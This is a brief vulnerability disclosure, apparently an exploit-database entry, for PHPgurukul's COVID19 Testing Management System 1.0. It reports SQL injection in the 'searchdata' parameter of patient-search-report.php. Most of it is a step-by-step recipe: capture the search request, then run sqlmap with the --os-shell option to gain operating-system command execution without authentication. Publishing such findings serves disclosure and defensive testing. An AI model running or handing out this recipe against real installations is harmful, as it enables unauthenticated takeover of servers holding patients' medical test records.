Description:

The COVID19 Testing Management System 1.0 application from PHPgurukul is vulnerable to
SQL injection via the 'searchdata' parameter on the patient-search-report.php page.

==================== 1. SQLi ====================

http://192.168.0.107:80/covid-tms/patient-search-report.php

The "searchdata" parameter is vulnerable to SQL injection, it was also tested, and a un-authenticated
user has the full ability to run system commands via --os-shell and fully compromise the system

POST parameter 'searchdata' is vulnerable.

step 1 : Navigate to the "Test Report >> Search Report" and enter any random value & capture the request in the proxy tool.
step 2 : Now copy the post request and save it as test.txt file.
step 3 : Run the sqlmap command "sqlmap -r test.txt -p searchdata --os-shell"
